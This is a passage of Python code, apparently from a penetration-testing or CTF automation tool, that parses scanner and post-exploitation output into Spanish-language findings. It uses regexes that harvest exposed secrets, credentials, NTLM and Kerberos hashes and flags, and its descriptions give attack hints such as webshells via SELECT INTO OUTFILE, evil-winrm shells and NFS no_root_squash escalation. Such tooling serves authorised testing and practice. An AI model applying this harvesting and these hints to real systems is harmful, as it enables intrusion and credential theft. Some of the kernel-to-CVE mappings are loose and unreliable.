        if req:
            ev_parts.append(f"Request:\n{req}")
        if resp:
            ev_parts.append(f"Response (snippet):\n{resp}")
        remediation = (info.get('remediation') or '').strip()
        findings.append({
            'id': str(uuid.uuid4()),
            'title': f'[Nuclei] {name}',
            'severity': sev, 'status': 'open',
            'cve': cve, 'cvss': cvss,
            'description': desc or f'Nuclei detectó {tid} en {matched_at}',
            'evidence': "\n\n".join(ev_parts),
            'remediation': remediation,
            'hosts': [rhost] if rhost else [],
            'source': 'nuclei',
        })
        _nuclei_json_found = True

    if not _nuclei_json_found:
        # Fallback: text parser for Nuclei without -j flag
        # Handles: [timestamp] [template-id] [type] [severity] url
        _NUCLEI_PROTO = {'http', 'tcp', 'udp', 'dns', 'ssl', 'code', 'network', 'file',
                         'headless', 'websocket', 'whois', 'javascript'}
        for _nline in output_text.splitlines():
            _nline_clean = re.sub(r'\x1b\[[0-9;]*m', '', _nline)
            _sev_m = re.search(r'\[(critical|high|medium|low)\]', _nline_clean, re.IGNORECASE)
            if not _sev_m:
                continue
            _sev = _sev_m.group(1).lower()
            _pre = _nline_clean[:_sev_m.start()]
            _pre_brackets = re.findall(r'\[([^\]]+)\]', _pre)
            _tid = next(
                (b for b in reversed(_pre_brackets)
                 if not re.match(r'\d{4}-\d{2}-\d{2}', b)
                 and b.lower() not in _NUCLEI_PROTO
                 and b.lower() not in {'inf', 'wrn', 'err', 'dbg', 'war', 'fat'}
                 and len(b) > 2),
                ''
            )
            if not _tid:
                continue
            _post = _nline_clean[_sev_m.end():]
            _url_m = re.search(r'https?://\S+|(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/\S*)?', _post)
            _url = _url_m.group(0) if _url_m else rhost
            _cve = _tid if re.match(r'cve-\d{4}-\d+', _tid, re.IGNORECASE) else ''
            findings.append({
                'id': str(uuid.uuid4()), 'title': f'[Nuclei] {_tid}',
                'severity': _sev, 'status': 'open',
                'cve': _cve, 'cvss': None,
                'description': f'Nuclei detectó {_tid} en {_url}',
                'evidence': _nline_clean.strip(),
                'hosts': [rhost] if rhost else [], 'source': 'nuclei',
            })

    # ── JS Secrets / Hidden API endpoints ─────────────────────────────────────
    _JS_SECRET_PAT = re.compile(
        r'(?i)(api[_\-]?key|apikey|access[_\-]?token|auth[_\-]?token|secret[_\-]?key|'
        r'client[_\-]?secret|aws[_\-]?access|aws[_\-]?secret|firebase|twilio|stripe|'
        r'sendgrid|mailchimp|slack[_\-]?token|github[_\-]?token|bearer\s+[a-zA-Z0-9._\-]{20,}|'
        r'eyJ[a-zA-Z0-9._\-]{40,})[^\s\'"<>]{0,80}'
    )
    _JS_ENDPOINT_PAT = re.compile(
        r'(?:/v\d+/[a-zA-Z0-9/_\-]{3,40}|https?://[a-zA-Z0-9./_\-]{8,}api[a-zA-Z0-9./_?=\-]{0,60})'
    )
    if 'JS-Secrets' in job_name or re.search(r'===\s*https?://', output_text):
        _js_secrets = _JS_SECRET_PAT.findall(output_text)
        _js_endpoints = list(set(_JS_ENDPOINT_PAT.findall(output_text)))[:20]
        if _js_secrets:
            _unique_secrets = list(dict.fromkeys(_js_secrets))[:20]
            findings.append({
                "id": str(uuid.uuid4()),
                "title": f"JS — Secretos/Tokens Expuestos en JavaScript ({len(_unique_secrets)} hallazgos)",
                "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
                "description": (
                    "Se han encontrado posibles API keys, tokens de autenticación u otros secretos "
                    "embebidos en archivos JavaScript del target. Revisar y revocar inmediatamente."
                ),
                "evidence": "\n".join(_unique_secrets[:15]),
                "hosts": [rhost] if rhost else [], "source": "js-secrets",
            })
        if _js_endpoints:
            _internal_ep = [e for e in _js_endpoints if '/api/' in e or '/v1/' in e or '/v2/' in e or '/internal/' in e]
            if _internal_ep:
                findings.append({
                    "id": str(uuid.uuid4()),
                    "title": f"JS — Endpoints de API Internos Descubiertos ({len(_internal_ep)})",
                    "severity": "medium", "status": "open", "cve": "", "cvss": 5.3,
                    "description": (
                        "Archivos JavaScript exponen rutas de API internas que podrían no estar "
                        "protegidas o revelar funcionalidad oculta."
                    ),
                    "evidence": "\n".join(_internal_ep[:15]),
                    "hosts": [rhost] if rhost else [], "source": "js-secrets",
                })

    # ── Sudo NOPASSWD privesc possible ────────────────────────────────────────
    if re.search(r'PRIVESC_POSSIBLE_SUDO', output_text):
        sudo_line = re.search(r'(NOPASSWD[^\n]+)', output_text)
        findings.append({
            "id": str(uuid.uuid4()), "title": "PrivEsc — sudo NOPASSWD Explotable",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.8,
            "description": "El usuario puede ejecutar un binario con sudo sin contraseña. PrivEsc a root probable via GTFOBins.",
            "evidence": sudo_line.group(0) if sudo_line else "",
            "hosts": [rhost] if rhost else [], "source": "post-exploit",
        })

    # ── SUID binaries found ───────────────────────────────────────────────────
    # Require a proper absolute path prefix (/usr/bin, /bin, /sbin, /usr/sbin, /opt/.../bin)
    # and a word boundary AFTER the tool name to avoid matching /tcp, //nmap, /openssh/openssh etc.
    suid_bins = re.findall(
        r'(/(?:usr(?:/local)?/(?:bin|sbin)|bin|sbin|opt/[^/\s]+/bin)'
        r'/(?:python|perl|ruby|bash|dash|find|nmap|vim|nano|awk|tar|zip|curl|wget|mv|less|more)'
        r'(?:\d+(?:\.\d+)?)?)\b',
        output_text,
    )
    # Remove duplicates and any path that still looks wrong (must be a real absolute path)
    suid_bins = [p for p in dict.fromkeys(suid_bins) if p.count('/') >= 2 and len(p) > 5]
    if suid_bins:
        findings.append({
            "id": str(uuid.uuid4()), "title": f"PrivEsc — SUID Bins Explotables ({len(suid_bins)})",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.8,
            "description": f"Binarios SUID explotables via GTFOBins: {', '.join(set(suid_bins[:5]))}",
            "evidence": "\n".join(set(suid_bins[:10])),
            "hosts": [rhost] if rhost else [], "source": "post-exploit",
        })

    # ── Root flag found ───────────────────────────────────────────────────────
    for m in re.finditer(r'root\.txt[:\s]+([a-fA-F0-9]{32,})|(/root/root\.txt\n)([a-fA-F0-9]{32,})', output_text, re.IGNORECASE):
        flag_val = (m.group(1) or m.group(3) or "").strip()
        if flag_val:
            loot.append({"type": "flag", "value": f"root.txt: {flag_val}", "source": rhost})
            findings.append({
                "id": str(uuid.uuid4()), "title": "ROOT FLAG OBTENIDA",
                "severity": "critical", "status": "open", "cve": "", "cvss": 10.0,
                "description": f"Flag root.txt capturada: {flag_val}",
                "evidence": flag_val, "hosts": [rhost] if rhost else [], "source": "post-exploit",
            })

    # ── WinRM access ─────────────────────────────────────────────────────────
    if re.search(r'winrm.*\[\+\]|crackmapexec.*winrm.*Pwn3d', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "WinRM — Acceso Remoto Confirmado",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "WinRM accesible con credenciales válidas. Usar evil-winrm para shell.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "crackmapexec",
        })

    # ── Shellshock ────────────────────────────────────────────────────────────
    if re.search(r'SHELLSHOCK_RCE|shellshock.*uid=|CGI.*\(\)\s*\{.*\}.*RCE', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — Shellshock RCE Confirmado (CVE-2014-6271)",
            "severity": "critical", "status": "open", "cve": "CVE-2014-6271", "cvss": 10.0,
            "description": "Shellshock confirmado — CGI ejecuta comandos arbitrarios via variable de entorno.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "shellshock-probe",
        })

    # ── Apache Path Traversal (CVE-2021-41773) ────────────────────────────────
    if re.search(r'root:.*:/bin/|root:x:0:0|passwd.*root.*nologin', output_text) and not re.search(r'grep.*root|nologin.*filter', output_text):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — Path Traversal / LFI — /etc/passwd Leído",
            "severity": "critical", "status": "open", "cve": "CVE-2021-41773", "cvss": 9.8,
            "description": "Path traversal confirmado — /etc/passwd accesible. Posible RCE si mod_cgi activo.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "path-traversal",
        })

    # ── .env / sensitive files exposed ───────────────────────────────────────
    if re.search(r'APP_KEY=|DB_PASSWORD=|SECRET_KEY=|API_KEY=|APP_SECRET=', output_text):
        secrets = re.findall(r'((?:APP_KEY|DB_PASSWORD|SECRET_KEY|API_KEY)[^\n]{0,80})', output_text)
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — Archivo .env con Secretos Expuesto",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.1,
            "description": "Archivo .env accesible públicamente — credenciales, API keys y secrets expuestos.",
            "evidence": "\n".join(secrets[:5]), "hosts": [rhost] if rhost else [], "source": "env-check",
        })

    # ── phpinfo exposed ───────────────────────────────────────────────────────
    if re.search(r'PHPINFO_EXPOSED:|PHP Version.*phpinfo|phpinfo().*PHP_VERSION', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — phpinfo() Expuesto",
            "severity": "medium", "status": "open", "cve": "", "cvss": 5.3,
            "description": "phpinfo() accesible — expone versión PHP, extensiones, rutas del servidor, variables de entorno.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "phpinfo-check",
        })

    # ── Backup files found ────────────────────────────────────────────────────
    backup_found = re.findall(r'BACKUP_FILE_FOUND:(\S+)', output_text)
    if backup_found:
        findings.append({
            "id": str(uuid.uuid4()), "title": f"Web — Archivos de Backup Accesibles ({', '.join(backup_found[:3])})",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": f"Archivos de backup accesibles: {', '.join(backup_found)}. Posible exposición de código fuente y credenciales.",
            "evidence": "\n".join(backup_found), "hosts": [rhost] if rhost else [], "source": "backup-check",
        })

    # ── Directory listing enabled ─────────────────────────────────────────────
    if re.search(r'Index of /|Parent Directory.*href|Directory listing for /', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — Directory Listing Habilitado",
            "severity": "medium", "status": "open", "cve": "", "cvss": 5.3,
            "description": "El servidor web permite listar directorios. Expone estructura de archivos y posibles ficheros sensibles.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "dir-listing",
        })

    # ── SSH no password / weak auth ───────────────────────────────────────────
    if re.search(r'ssh-auth-methods.*none\b|publickey,none|Supported.*none', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "SSH — Autenticación Sin Contraseña Posible",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "SSH acepta método 'none' — posible login sin credenciales.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "ssh-check",
        })

    # ── Heartbleed ────────────────────────────────────────────────────────────
    if re.search(r'Heartbleed|VULNERABLE.*heartbleed|ssl-heartbleed.*VULNERABLE', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "SSL — Heartbleed (CVE-2014-0160)",
            "severity": "critical", "status": "open", "cve": "CVE-2014-0160", "cvss": 7.5,
            "description": "Heartbleed confirmado — fuga de hasta 64KB de memoria del servidor por petición.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "heartbleed-check",
        })

    # ── MSSQL SA empty password ───────────────────────────────────────────────
    if re.search(r'sa.*login.*success|mssql.*login.*sa.*ok|sa.*access.*granted', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "MSSQL — Login SA Sin Contraseña",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "MSSQL acepta login como 'sa' sin contraseña. Acceso completo a todas las bases de datos y posible xp_cmdshell.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "mssql-check",
        })

    # ── PostgreSQL no auth ────────────────────────────────────────────────────
    if re.search(r'psql.*connection.*successful|postgres.*authenticated|postmaster.*pid', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "PostgreSQL — Acceso Sin Contraseña",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": "PostgreSQL accesible sin contraseña. Posible COPY TO/FROM webshell o acceso a datos.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "postgres-check",
        })

    # ── Rsync no auth ─────────────────────────────────────────────────────────
    if re.search(r'rsync.*anonymous|rsync.*no.*auth|rsync.*list.*modules', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Rsync — Acceso Anónimo Permitido",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": "Rsync accesible sin autenticación. Posible lectura/escritura de archivos del servidor.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "rsync-check",
        })

    # ── Tomcat default creds confirmed ────────────────────────────────────────
    if re.search(r'TOMCAT_CREDS_VALID:', output_text):
        m = re.search(r'TOMCAT_CREDS_VALID:(\S+)', output_text)
        findings.append({
            "id": str(uuid.uuid4()), "title": f"Tomcat Manager — Credenciales por Defecto Confirmadas",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": f"Tomcat Manager accesible con creds por defecto: {m.group(1) if m else ''}. Posible WAR upload para RCE.",
            "evidence": m.group(0) if m else "", "hosts": [rhost] if rhost else [], "source": "tomcat-check",
        })

    # ── Jenkins Groovy RCE ────────────────────────────────────────────────────
    if re.search(r'Jenkins.*Groovy.*uid=|println.*id.*uid=\d|groovy.*script.*uid=', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Jenkins — Script Console RCE Confirmado",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "Jenkins Script Console permite ejecución de código Groovy sin autenticación.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "jenkins-rce",
        })

    # ── phpMyAdmin webshell ───────────────────────────────────────────────────
    if re.search(r'PHPMYADMIN_CREDS:|phpMyAdmin.*SELECT.*OUTFILE', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "phpMyAdmin — Credenciales Confirmadas / Webshell Posible",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "phpMyAdmin accesible con credenciales. Posible RCE via SELECT INTO OUTFILE webshell.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "phpmyadmin-check",
        })

    # ── rlogin / rexec / rsh access ───────────────────────────────────────────
    if re.search(r'rlogin.*success|rexec.*success|rsh.*uid=|r-service.*access|RLOGIN_OK', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "R-Services — Acceso Sin Autenticación Confirmado",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "rlogin/rexec/rsh accesible sin contraseña — acceso root trivial.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "rservices-check",
        })

    # ── NFS no_root_squash ────────────────────────────────────────────────────
    if re.search(r'NFS_NO_ROOT_SQUASH_CONFIRMED|no_root_squash', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "NFS — no_root_squash Confirmado (PrivEsc a Root)",
            "severity": "critical", "status": "open", "cve": "", "cvss": 8.1,
            "description": "NFS exporta con no_root_squash — montar y crear SUID bash permite escalar a root en el target.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "nfs-check",
        })

    # ── NFS exports reachable ─────────────────────────────────────────────────
    if re.search(r'NFS_MOUNTED_OK|Export list for|/\w+.*\(', output_text) and "nfs" in job_name.lower():
        exports_found = re.findall(r'(/[/\w\-]+)\s+\(', output_text)
        if exports_found:
            findings.append({
                "id": str(uuid.uuid4()), "title": f"NFS — Exports Montables Sin Auth ({len(exports_found)})",
                "severity": "high", "status": "open", "cve": "", "cvss": 6.5,
                "description": f"NFS exports accesibles: {', '.join(exports_found[:5])}",
                "evidence": "\n".join(exports_found[:5]),
                "hosts": [rhost] if rhost else [], "source": "nfs-check",
            })

    # ── Jenkins accessible without auth ──────────────────────────────────────
    if re.search(r'X-Jenkins:|Jenkins.*Accessible|/script.*200', output_text, re.IGNORECASE):
        if re.search(r'200', output_text):
            findings.append({
                "id": str(uuid.uuid4()), "title": "Jenkins — Script Console Accesible Sin Auth",
                "severity": "critical", "status": "open", "cve": "CVE-2018-1000861", "cvss": 9.8,
                "description": "Jenkins /script accesible sin autenticación — RCE via Groovy Script Console.",
                "evidence": "", "hosts": [rhost] if rhost else [], "source": "jenkins-check",
            })

    # ── Elasticsearch unauthenticated ─────────────────────────────────────────
    if re.search(r'elasticsearch.*"cluster_name"|"status"\s*:\s*"(green|yellow)"', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Elasticsearch — Acceso Sin Autenticación",
            "severity": "critical", "status": "open", "cve": "CVE-2014-3120", "cvss": 9.8,
            "description": "Elasticsearch accesible sin auth — todos los índices y datos expuestos.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "elastic-check",
        })

    # ── CouchDB admin party ───────────────────────────────────────────────────
    if re.search(r'"couchdb"\s*:\s*"Welcome"|_all_dbs|"version"\s*:\s*"[12]\.',
                  output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "CouchDB — Admin Party (Sin Autenticación)",
            "severity": "critical", "status": "open", "cve": "CVE-2017-12635", "cvss": 9.8,
            "description": "CouchDB accesible sin auth — acceso total a bases de datos y posible RCE.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "couchdb-check",
        })

    # ── Hadoop YARN RCE ───────────────────────────────────────────────────────
    if re.search(r'hadoopVersion|HADOOP_YARN_RCE|resourcemanager.*state.*RUNNING',
                  output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Hadoop YARN — RCE Sin Autenticación",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "Hadoop YARN ResourceManager accesible sin auth — job submission permite RCE.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "hadoop-yarn",
        })

    # ── VNC no auth ───────────────────────────────────────────────────────────
    if re.search(r'Authentication.*None|vnc.*no.*auth|rfb.*\|.*None required|security type.*1.*\bnone\b',
                  output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "VNC — Sin Autenticación (Acceso Directo al Escritorio)",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "VNC accesible sin contraseña — control total del escritorio remoto.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "vnc-check",
        })

    # ── X11 open ──────────────────────────────────────────────────────────────
    if re.search(r'X11_OPEN|screen.*dimensions|number of screens|xdpyinfo.*display',
                  output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "X11 — Display Expuesto Sin Control de Acceso",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.0,
            "description": "X11 display accesible remotamente — captura de pantalla, keylogging y toma de control posible.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "x11-check",
        })

    # ── IPMI hash leaked ──────────────────────────────────────────────────────
    if re.search(r'IPMI.*Hash|rakp.*hash|ipmi.*\$rakp', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "IPMI — Hash RAKP Extraído Sin Auth",
            "severity": "critical", "status": "open", "cve": "CVE-2013-4786", "cvss": 9.8,
            "description": "IPMI 2.0 permite extraer hashes RAKP sin autenticación — crackear offline con hashcat.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "ipmi-check",
        })

    # ── ProFTPD mod_copy RCE ──────────────────────────────────────────────────
    if re.search(r'proftpd.*mod_copy|SITE CPFR.*SITE CPTO|proftpd.*rce.*confirm',
                  output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "ProFTPD mod_copy — RCE Confirmado (CVE-2015-3306)",
            "severity": "critical", "status": "open", "cve": "CVE-2015-3306", "cvss": 10.0,
            "description": "ProFTPD 1.3.5 mod_copy permite SITE CPFR/CPTO sin auth — copiar archivos arbitrarios → webshell.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "proftpd-check",
        })

    # ── Webmin backdoor ───────────────────────────────────────────────────────
    if re.search(r'webmin.*backdoor|webmin.*rce.*confirm|Webmin.*cmd.*uid=',
                  output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Webmin — Backdoor RCE Sin Auth (CVE-2019-15107)",
            "severity": "critical", "status": "open", "cve": "CVE-2019-15107", "cvss": 9.8,
            "description": "Webmin 1.882-1.921 tiene backdoor — RCE sin autenticación via password_change.cgi.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "webmin-check",
        })

    # ── MySQL webshell written ────────────────────────────────────────────────
    if re.search(r'MYSQL_WEBSHELL_WRITTEN|INTO OUTFILE.*\.php|File.*created.*\.php',
                  output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "MySQL — Webshell Escrita via SELECT INTO OUTFILE",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "MySQL root sin password + FILE privilege — webshell PHP escrita en webroot.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "mysql-exploit",
        })

    # ── RDP BlueKeep ─────────────────────────────────────────────────────────
    if re.search(r'BlueKeep|CVE-2019-0708.*vulnerable|rdp.*bluekeep.*VULNERABLE', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "RDP — BlueKeep (CVE-2019-0708) Vulnerable",
            "severity": "critical", "status": "open", "cve": "CVE-2019-0708", "cvss": 9.8,
            "description": "BlueKeep confirmado — RCE sin autenticación en RDP. Gusanable (wormable).",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "bluekeep-check",
        })

    # ── Impacket secretsdump success ──────────────────────────────────────────
    secretsdump_hashes = re.findall(r'(\w+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', output_text)
    if secretsdump_hashes:
        h_users = [f"{h[0]}" for h in secretsdump_hashes[:5]]
        findings.append({
            "id": str(uuid.uuid4()), "title": f"Secretsdump — {len(secretsdump_hashes)} Hashes Extraídos",
            "severity": "critical", "status": "open", "cve": "", "cvss": 10.0,
            "description": f"impacket-secretsdump extrajo hashes NTLM: {', '.join(h_users)}. Crackeable offline o Pass-the-Hash.",
            "evidence": "\n".join(f"{h[0]}:{h[2]}:{h[3]}" for h in secretsdump_hashes[:10]),
            "hosts": [rhost] if rhost else [], "source": "secretsdump",
        })
        for h in secretsdump_hashes[:10]:
            loot.append({"type": "hash", "value": f"{h[0]}:{h[2]}:{h[3]}", "source": "secretsdump"})

    # ── PSExec / WMIExec / SMBExec shell ─────────────────────────────────────
    if re.search(r'C:\\Windows\\system32>', output_text) or re.search(r'Microsoft Windows \[Version|nt authority\\system', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "PWNED — Shell Remota Obtenida (Impacket)",
            "severity": "critical", "status": "open", "cve": "", "cvss": 10.0,
            "description": "Shell remota obtenida via psexec/wmiexec/smbexec. Control total del sistema.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "impacket",
        })

    # ── Kerberoast / AS-REP hashes ───────────────────────────────────────────
    kerb_found = re.findall(r'(\$krb5tgs\$\d+\$\*?[^\$]+\$[^\s]{20,})', output_text)
    asrep_found = re.findall(r'(\$krb5asrep\$\d+\$[^\s]{20,})', output_text)
    if kerb_found:
        findings.append({
            "id": str(uuid.uuid4()), "title": f"AD — Kerberoasting: {len(kerb_found)} TGS Capturados",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": f"Kerberoasting exitoso — {len(kerb_found)} TGS hash(es) capturados. Crackeable offline con hashcat.",
            "evidence": "\n".join(kerb_found[:3]),
            "hosts": [rhost] if rhost else [], "source": "kerberoasting",
        })
    if asrep_found:
        findings.append({
            "id": str(uuid.uuid4()), "title": f"AD — AS-REP Roasting: {len(asrep_found)} Cuentas sin Pre-Auth",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": f"AS-REP Roasting exitoso — {len(asrep_found)} hash(es) capturados. Crackeable offline.",
            "evidence": "\n".join(asrep_found[:3]),
            "hosts": [rhost] if rhost else [], "source": "asrep-roasting",
        })

    # ── searchsploit / known CVE in version ─────────────────────────────────
    edb_re = re.compile(r'EDB-ID:\s*(\d+)', re.IGNORECASE)
    for m in edb_re.finditer(output_text):
        findings.append({
            "id": str(uuid.uuid4()), "title": f"Exploit disponible (EDB-{m.group(1)})",
            "severity": "high", "status": "open", "cve": "", "cvss": None,
            "description": f"Searchsploit encontró exploit EDB-ID {m.group(1)} aplicable al target.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "searchsploit",
        })

    # ── Credentials (hydra, nxc, generic [+]) ────────────────────────────────
    cred_res = [
        re.compile(r'\[\d+\]\[\w+\]\s+host:\s+\S+\s+login:\s+(\S+)\s+password:\s+(\S+)'),    # hydra
        re.compile(r'nxc\s+\S+\s+\[\+\]\s+\S*\\?(\S+):(\S+)(?!\s*\(Pwn3d)', re.IGNORECASE), # nxc non-admin
        re.compile(r'\[\+\]\s+(\w[\w.@-]{1,40}):(\S{2,40})'),                                # generic [+] u:p
    ]
    for pat in cred_res:
        for m in pat.finditer(output_text):
            val = f"{m.group(1)}:{m.group(2)}"
            if val not in {i['value'] for i in loot}:
                loot.append({"type": "credential", "value": val, "source": tool})

    # ── Hashes ────────────────────────────────────────────────────────────────
    hash_res = [
        (re.compile(r'\b([a-fA-F0-9]{32}:[a-fA-F0-9]{32})\b'), "hash"),
        (re.compile(r'(\$krb5tgs\$\d+\$[^\s]{20,})'),           "hash"),
        (re.compile(r'(\$krb5asrep\$\d+\$[^\s]{20,})'),         "hash"),
        (re.compile(r'(\$2[aby]\$\d+\$[^\s]{50,})'),            "hash"),
        (re.compile(r'\b([a-fA-F0-9]{32})\b'),                  "hash"),  # MD5/NTLM single
    ]
    seen_hashes = set()
    for pat, ltype in hash_res:
        for m in pat.finditer(output_text):
            v = m.group(1)
            if v not in seen_hashes:
                seen_hashes.add(v)
                loot.append({"type": ltype, "value": v, "source": tool})

    # ── Flags ─────────────────────────────────────────────────────────────────
    for pat in [re.compile(r'HTB\{[^}]+\}'),
                re.compile(r'flag\{[^}]+\}', re.IGNORECASE),
                re.compile(r'OSCP\{[^}]+\}', re.IGNORECASE),
                re.compile(r'THM\{[^}]+\}'),
                re.compile(r'user\.txt[:\s]+([a-fA-F0-9]{32})', re.IGNORECASE),
                re.compile(r'root\.txt[:\s]+([a-fA-F0-9]{32})', re.IGNORECASE)]:
        for m in pat.finditer(output_text):
            loot.append({"type": "flag", "value": m.group(0), "source": tool})

    # ── LinPEAS / WinPEAS output parser ──────────────────────────────────────
    _is_peas = any(m in output_text for m in [
        '╔══════════╣', 'linpeas', 'LINPEAS', 'WINPEAS', 'ÉÍÍÍÍ', 'winpeas',
        'Linux Privilege Escalation', 'Windows Privilege Escalation',
    ])
    if _is_peas or 'LinPEAS' in job_name or 'WinPEAS' in job_name:
        _ac = re.sub(r'\x1b\[[0-9;]*[mGKH]', '', output_text)  # strip ANSI
        # Kernel version → CVE map
        _KERNEL_CVE = [
            (r'3\.\d+\.\d+',       'CVE-2016-5195', 'Dirty COW', 9.8),
            (r'4\.[0-8]\.\d+',     'CVE-2017-16995', 'eBPF/DirtyC0w', 9.8),
            (r'4\.(1[0-5])\.\d+',  'CVE-2017-16995', 'eBPF privesc', 9.8),
            (r'5\.(8|9|10|11)\.\d+','CVE-2021-4034', 'PwnKit (pkexec)', 7.8),
            (r'5\.(1[2-9]|[2-9]\d)\.\d+','CVE-2022-0847','DirtyPipe', 7.8),
        ]
        _km = re.search(r'Linux version ([\d.]+)', _ac)
        if _km:
            for pat, cve, desc, cvss in _KERNEL_CVE:
                if re.match(pat, _km.group(1)):
                    findings.append({
                        "id": str(uuid.uuid4()),
                        "title": f"PrivEsc — Kernel {_km.group(1)} ({cve} {desc})",
                        "severity": "critical" if cvss >= 9 else "high",
                        "status": "open", "cve": cve, "cvss": cvss,
                        "description": f"Kernel {_km.group(1)} vulnerable a {desc}. Exploit público disponible.",
                        "evidence": _km.group(0), "hosts": [rhost] if rhost else [], "source": "linpeas",
                    })
        # Capabilities → root
        _caps = re.findall(r'(/[/\w\-]+)\s*=.*cap_set(?:uid|gid)', _ac, re.I)
        if _caps:
            findings.append({
                "id": str(uuid.uuid4()),
                "title": f"PrivEsc — Capabilities Peligrosas ({len(_caps)} binario(s))",
                "severity": "high", "status": "open", "cve": "", "cvss": 7.8,
                "description": f"Binarios con cap_setuid/cap_setgid permiten escalada directa a root: {', '.join(_caps[:4])}",
                "evidence": "\n".join(_caps[:10]), "hosts": [rhost] if rhost else [], "source": "linpeas",
            })
        # Writable /etc/passwd
        if re.search(r'(/etc/passwd).*writable|writable.*/etc/passwd|\[write\].*passwd', _ac, re.I):
            findings.append({
                "id": str(uuid.uuid4()), "title": "PrivEsc — /etc/passwd Escribible",
                "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
                "description": "El archivo /etc/passwd es escribible. Permite añadir usuario root sin contraseña y escalar trivialmente.",
                "evidence": "/etc/passwd writable", "hosts": [rhost] if rhost else [], "source": "linpeas",
            })
        # Docker / LXD group
        if re.search(r'\(docker\)|\(lxd\)|docker\s+group|lxd\s+group', _ac, re.I):
            findings.append({
                "id": str(uuid.uuid4()), "title": "PrivEsc — Membresía en Grupo Docker/LXD",
                "severity": "high", "status": "open", "cve": "", "cvss": 8.8,
                "description": "El usuario pertenece al grupo docker o lxd. Container escape → shell root trivial.",
                "evidence": "docker/lxd group", "hosts": [rhost] if rhost else [], "source": "linpeas",
            })
        # Writable cron
        _wcron = re.findall(r'(/etc/cron[^\s\n]*|/var/spool/cron/[^\s\n]*)', _ac)
        if _wcron and re.search(r'writable|write\|rw', _ac, re.I):
